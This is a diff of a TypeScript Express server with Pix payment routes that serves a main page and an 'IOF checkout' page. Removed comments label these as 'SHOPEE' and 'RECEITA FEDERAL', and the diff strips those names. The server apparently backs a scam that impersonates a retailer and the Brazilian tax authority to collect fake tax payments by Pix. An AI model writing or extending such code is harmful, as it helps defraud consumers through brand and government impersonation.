@@ -1,40 +1,41 @@
 import express from 'express';
 import cors from 'cors';
 import path from 'path';
-import { PixController } from './controllers/PixController'; // Importamos o controlador direto
+import { PixController } from './controllers/PixController';
 
 const app = express();
-const pixController = new PixController(); // Ligamos o motor do Pix
+const pixController = new PixController();
 
 app.use(cors());
 app.use(express.json());
 
-// --- AQUI ESTÃO AS ROTAS DA API (GPS) ---
+// --- ROTAS DA API ---
 app.post('/pix', pixController.create);
 app.get('/pix/:id', pixController.checkStatus);
 app.post('/webhook', pixController.webhook);
 
-// --- ROTA 1: SITE PRINCIPAL (SHOPEE) ---
-// Quando acessar a raiz (/), entrega o index.html
+// --- ROTA 1: SITE PRINCIPAL ---
 const publicPath = path.resolve(__dirname, '..', 'index.html');
 app.get('/', (req, res) => {
-    res.sendFile(publicPath, (err) => {
-        if (err) res.status(500).send("Erro ao carregar site: " + err.message);
-    });
+    res.sendFile(publicPath);
 });
 
-// --- ROTA 2: PÁGINA DE IOF (RECEITA FEDERAL) ---
-// Quando acessar /iof.html, entrega o arquivo iof.html
+// --- ROTA 2: CHECKOUT IOF ---
 const iofPath = path.resolve(__dirname, '..', 'iof.html');
 app.get('/iof.html', (req, res) => {
-    res.sendFile(iofPath, (err) => {
-        if (err) res.status(500).send("Erro ao carregar IOF: " + err.message);
+    res.sendFile(iofPath);
+});
+
+// --- ROTA 3: IMAGEM DO BANNER (NOVO) ---
+// Isso permite que o site carregue a imagem 'banner.jpg'
+const bannerPath = path.resolve(__dirname, '..', 'banner.jpg');
+app.get('/banner.jpg', (req, res) => {
+    res.sendFile(bannerPath, (err) => {
+        if (err) res.status(404).send("Imagem não encontrada. Verifique se o arquivo 'banner.jpg' está na pasta.");
     });
 });
 
 const PORT = process.env.PORT || 3000;
-
-// O '0.0.0.0' é fundamental para a Render encontrar seu app
 app.listen(Number(PORT), '0.0.0.0', () => {
-    console.log(`🚀 Servidor rodando e escutando na porta ${PORT}`);
+    console.log(`🚀 Servidor rodando na porta ${PORT}`);
 });
